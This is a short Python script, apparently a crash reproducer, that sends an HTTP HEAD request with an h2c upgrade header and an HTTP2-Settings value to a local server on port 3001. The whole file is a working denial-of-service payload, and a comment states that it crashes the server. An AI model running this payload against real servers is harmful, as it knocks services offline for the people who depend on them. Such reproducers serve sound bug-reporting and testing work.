import socket
import struct

SERVER_IP = "localhost"

def crash():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    s.connect((SERVER_IP, 3001))

    l_onoff = 1
    l_linger = 0
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", l_onoff, l_linger))

    # Sending the upgrade header will cause the server to crash
    message = b"HEAD / HTTP/1.1\r\nconnection: Upgrade, HTTP2-Settings\r\nupgrade: h2c\r\nhttp2-settings: AAMAAABkAAQAAP__\r\nHost: www.example.com\r\n\r\n"

    # Sending a normal HEAD without upgrade header won't crash
    # message = b"HEAD / HTTP/1.1\r\nHost: www.example.com\r\n\r\n"
    s.send(message)
    print(s.recv(1000).decode())
    s.close()

if __name__ == "__main__":
    crash()